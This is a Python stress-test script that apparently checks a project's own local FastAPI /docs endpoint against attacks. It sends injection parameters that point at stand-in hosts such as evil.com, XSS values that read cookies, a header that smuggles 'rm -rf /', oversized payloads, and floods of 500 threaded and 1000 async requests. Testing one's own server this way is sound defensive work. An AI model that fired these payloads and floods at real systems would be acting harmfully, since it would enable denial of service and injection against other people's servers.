#!/usr/bin/env python3
"""GAJA Server /docs Endpoint Specific Attack Tests Specialized stress tests targeting
the /docs FastAPI documentation endpoint."""

import asyncio
import json
import logging
import random
import string
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import aiohttp
import requests

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(levelname)s:%(name)s:%(message)s")
logger = logging.getLogger(__name__)

BASE_URL = "http://localhost:8001"
DOCS_URL = f"{BASE_URL}/docs"


class DocsEndpointAttacker:
    def __init__(self):
        self.results = []

    def check_server(self):
        """Check if server is accessible."""
        try:
            response = requests.get(f"{BASE_URL}/health", timeout=5)
            return response.status_code == 200
        except:
            return False

    def docs_parameter_injection(self):
        """Test parameter injection attacks on /docs."""
        logger.info("🔍 Testing Docs Parameter Injection")

        malicious_params = [
            "?format=json",
            "?openapi=true",
            "?schema=raw",
            "?download=true",
            "?export=yaml",
            "?debug=1",
            "?admin=true",
            "?swagger_ui_init_oauth={}",
            "?url=http://evil.com/malicious.json",
            "?config_url=http://attacker.com/config",
            "?oauth2RedirectUrl=javascript:alert(1)",
            "?validatorUrl=null",
            "?dom_id=something_malicious",
            "?layout=StandaloneLayout",
            "?deepLinking=true&tryItOutEnabled=true",
            "?supportedSubmitMethods=[%22get%22,%22post%22,%22put%22,%22delete%22]",
            "?onComplete=function(){window.location='http://evil.com'}",
            "?presets=[SwaggerUIBundle.presets.apis,SwaggerUIStandalonePreset]",
            "?plugins=[SwaggerUIBundle.plugins.DownloadUrl]",
            "?syntaxHighlight={%22theme%22:%22agate%22}",
            "?showExtensions=true&showCommonExtensions=true",
            "?requestInterceptor=function(req){console.log(req);return req;}",
            "?responseInterceptor=function(res){console.log(res);return res;}",
            "?onFailure=function(data){console.log('Failed to load API definition.');}",
            "?docExpansion=list&apisSorter=alpha&operationsSorter=alpha",
            "?filter=true&showRequestHeaders=true",
            "?maxDisplayedTags=10&showMutatedRequest=true",
            "?defaultModelRendering=example&defaultModelsExpandDepth=1",
            "?defaultModelExpandDepth=1&displayOperationId=true",
            "?displayRequestDuration=true&persistAuthorization=true",
            "?tryItOutEnabled=true&requestSnippetsEnabled=true",
            "?oauth2RedirectUrl='javascript:alert(document.cookie)'",
            "?configUrl='data:application/json,{%22urls%22:[{%22url%22:%22http://evil.com%22}]}'",
        ]

        successful_params = []

        for param in malicious_params:
            try:
                url = f"{DOCS_URL}{param}"
                response = requests.get(url, timeout=10)
                logger.info(f"Parameter {param}: {response.status_code}")

                if response.status_code == 200:
                    successful_params.append(param)
                    # Check for XSS or injection in response
                    if any(
                        keyword in response.text.lower()
                        for keyword in ["script", "alert", "onerror", "eval"]
                    ):
                        logger.warning(f"⚠️ Potential XSS in response for {param}")

            except Exception as e:
                logger.error(f"Failed param {param}: {e}")

        logger.info(f"Successful parameter injections: {len(successful_params)}")
        return successful_params

    def docs_openapi_schema_attacks(self):
        """Attack OpenAPI schema endpoints."""
        logger.info("📋 Testing OpenAPI Schema Attacks")

        schema_urls = [
            f"{BASE_URL}/openapi.json",
            f"{BASE_URL}/api/openapi.json",
            f"{BASE_URL}/v1/openapi.json",
            f"{BASE_URL}/swagger.json",
            f"{BASE_URL}/api/swagger.json",
            f"{BASE_URL}/docs/swagger.json",
            f"{BASE_URL}/redoc",
            f"{BASE_URL}/api/docs",
            f"{BASE_URL}/api/redoc",
            f"{BASE_URL}/swagger-ui/",
            f"{BASE_URL}/swagger-ui/index.html",
            f"{BASE_URL}/api-docs",
            f"{BASE_URL}/api-docs/",
            f"{BASE_URL}/docs/",
        ]

        accessible_schemas = []

        for url in schema_urls:
            try:
                response = requests.get(url, timeout=5)
                logger.info(f"Schema {url}: {response.status_code}")

                if response.status_code == 200:
                    accessible_schemas.append(url)
                    # Check if it contains sensitive info
                    content = response.text.lower()
                    if any(
                        keyword in content
                        for keyword in [
                            "password",
                            "secret",
                            "token",
                            "api_key",
                            "private",
                        ]
                    ):
                        logger.warning(f"⚠️ Potential sensitive data in {url}")

            except Exception as e:
                logger.error(f"Failed schema {url}: {e}")

        return accessible_schemas

    def docs_resource_exhaustion(self):
        """Exhaust resources through docs endpoint."""
        logger.info("💥 Testing Docs Resource Exhaustion")

        def fetch_docs():
            try:
                response = requests.get(DOCS_URL, timeout=30)
                return response.status_code
            except:
                return None

        # Concurrent requests to docs
        start_time = time.time()
        successful = 0
        failed = 0

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(fetch_docs) for _ in range(500)]

            for future in as_completed(futures):
                result = future.result()
                if result == 200:
                    successful += 1
                else:
                    failed += 1

        duration = time.time() - start_time
        logger.info(f"Docs exhaustion: {successful}/500 successful in {duration:.2f}s")
        return successful, failed, duration

    def docs_payload_bombs(self):
        """Send payload bombs to docs."""
        logger.info("💣 Testing Docs Payload Bombs")

        # Large query strings
        large_params = [
            "?" + "&".join([f"param{i}={'A' * 1000}" for i in range(100)]),
            "?" + "data=" + "X" * 100000,
            "?" + "config=" + json.dumps({"data": "Y" * 50000}),
            "?" + "filter=" + "%20".join(["word"] * 10000),
        ]

        results = []

        for param in large_params:
            try:
                url = f"{DOCS_URL}{param}"
                start_time = time.time()
                response = requests.get(url, timeout=30)
                duration = time.time() - start_time

                logger.info(
                    f"Payload bomb {len(param)} chars: {response.status_code} in {duration:.2f}s"
                )
                results.append((len(param), response.status_code, duration))

            except Exception as e:
                logger.error(f"Payload bomb failed: {e}")
                results.append((len(param), None, None))

        return results

    def docs_malformed_requests(self):
        """Send malformed requests to docs."""
        logger.info("🔨 Testing Docs Malformed Requests")

        malformed_tests = []

        # HTTP method variations
        methods = ["POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
        for method in methods:
            try:
                response = requests.request(method, DOCS_URL, timeout=10)
                malformed_tests.append(f"{method}: {response.status_code}")
                logger.info(f"Method {method}: {response.status_code}")
            except Exception as e:
                malformed_tests.append(f"{method}: Failed - {e}")

        # Header attacks
        malicious_headers = {
            "Host": "evil.com",
            "X-Forwarded-Host": "attacker.com",
            "X-Forwarded-Proto": "javascript",
            "X-Real-IP": "127.0.0.1; rm -rf /",
            "User-Agent": "A" * 10000,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            * 100,
            "Accept-Language": "en-US,en;q=0.5" * 200,
            "Accept-Encoding": "gzip, deflate" * 500,
            "Connection": "keep-alive" * 100,
            "Cookie": "session=" + "A" * 8192,
            "Authorization": "Bearer " + "B" * 4096,
            "Content-Type": "application/json" + "C" * 1000,
            "Content-Length": "999999999",
            "Transfer-Encoding": "chunked, chunked, chunked",
            "Expect": "100-continue" * 10,
        }

        for header, value in malicious_headers.items():
            try:
                headers = {header: value}
                response = requests.get(DOCS_URL, headers=headers, timeout=10)
                malformed_tests.append(f"Header {header}: {response.status_code}")
                logger.info(f"Malicious header {header}: {response.status_code}")
            except Exception as e:
                malformed_tests.append(f"Header {header}: Failed - {e}")

        return malformed_tests

    async def docs_async_flood(self):
        """Async flood attack on docs."""
        logger.info("🌊 Testing Async Docs Flood")

        async def fetch_docs_async(session):
            try:
                async with session.get(DOCS_URL) as response:
                    return response.status
            except:
                return None

        async def run_flood():
            connector = aiohttp.TCPConnector(limit=200, limit_per_host=200)
            async with aiohttp.ClientSession(connector=connector) as session:
                tasks = [fetch_docs_async(session) for _ in range(1000)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                return results

        start_time = time.time()
        results = await run_flood()
        duration = time.time() - start_time

        successful = sum(1 for r in results if r == 200)
        logger.info(f"Async flood: {successful}/1000 successful in {duration:.2f}s")

        return successful, len(results), duration

    def run_all_tests(self):
        """Run all docs-specific attacks."""
        if not self.check_server():
            logger.error("❌ Server not accessible")
            return

        logger.info("✅ Server is running, starting docs-specific attacks...")
        logger.warning("⚠️ WARNING: These tests may impact server performance!")

        logger.info("📚 Starting Docs Endpoint Attack Suite")
        logger.info("=" * 60)

        start_time = time.time()

        # Parameter injection
        successful_params = self.docs_parameter_injection()

        # OpenAPI schema attacks
        accessible_schemas = self.docs_openapi_schema_attacks()

        # Resource exhaustion
        successful, failed, duration = self.docs_resource_exhaustion()

        # Payload bombs
        payload_results = self.docs_payload_bombs()

        # Malformed requests
        malformed_results = self.docs_malformed_requests()

        # Async flood
        async_results = asyncio.run(self.docs_async_flood())

        total_duration = time.time() - start_time

        # Results summary
        logger.info("=" * 60)
        logger.info("🏁 Docs Attack Test Results")
        logger.info(f"Duration: {total_duration:.2f} seconds")
        logger.info("Results:")
        logger.info(f"  - Parameter injections: {len(successful_params)} successful")
        logger.info(f"  - Accessible schemas: {len(accessible_schemas)}")
        logger.info(f"  - Resource exhaustion: {successful}/500 in {duration:.2f}s")
        logger.info(f"  - Payload bombs: {len(payload_results)} tested")
        logger.info(f"  - Malformed requests: {len(malformed_results)} tested")
        logger.info(
            f"  - Async flood: {async_results[0]}/1000 in {async_results[2]:.2f}s"
        )
        logger.info("=" * 60)

        # Save results
        results_data = {
            "parameter_injections": successful_params,
            "accessible_schemas": accessible_schemas,
            "resource_exhaustion": {
                "successful": successful,
                "failed": failed,
                "duration": duration,
            },
            "payload_bombs": payload_results,
            "malformed_requests": malformed_results,
            "async_flood": {
                "successful": async_results[0],
                "total": async_results[1],
                "duration": async_results[2],
            },
            "total_duration": total_duration,
            "timestamp": time.time(),
        }

        with open("docs_attack_results.json", "w") as f:
            json.dump(results_data, f, indent=2)

        logger.info("📊 Results saved to docs_attack_results.json")


def main():
    attacker = DocsEndpointAttacker()
    attacker.run_all_tests()


if __name__ == "__main__":
    main()
